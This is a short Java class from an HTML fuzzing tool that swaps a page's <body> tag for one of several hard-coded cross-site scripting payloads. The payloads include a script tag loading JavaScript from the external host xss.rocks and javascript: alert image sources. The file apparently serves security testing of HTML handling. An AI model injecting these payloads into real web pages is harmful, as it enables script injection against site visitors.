package htmlFuzzing;

import htmlFuzzing.spi.HtmlFuzzing;

import java.util.Random;

/**
 * scriptTagInserter class which implements the interface HtmlFuzzing
 * contains methods which will fuzz the string
 */
public class scriptTagInserter implements HtmlFuzzing {


    /**
     * getfuzz method here will fuzz the string by adding the malicious
     * scripts to the html code
     * @param code : the string containing some html code
     * @return a string which is modified by adding the malicious the scripts
     */
    @Override
    public String getfuzz(String code) {
        String[] list = {"<body> <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT> ", "<body> <IMG SRC=javascript:alert(&quot;XSS&quot;)> ","<body> <SCRIPT SRC=http://xss.rocks/xss.js?< B > ","<body> <IMG SRC=\"javascript:alert('XSS');\"> ","<body> <IMG SRC=javascript:alert(&quot;XSS&quot;)> "};
        String s = "Scripttaginserter";
        Random rand = new Random();
        int n = rand.nextInt(list.length);
        code = code.replace("<body>", list[n]);
        //System.out.println(code);
        return code;
    }
}
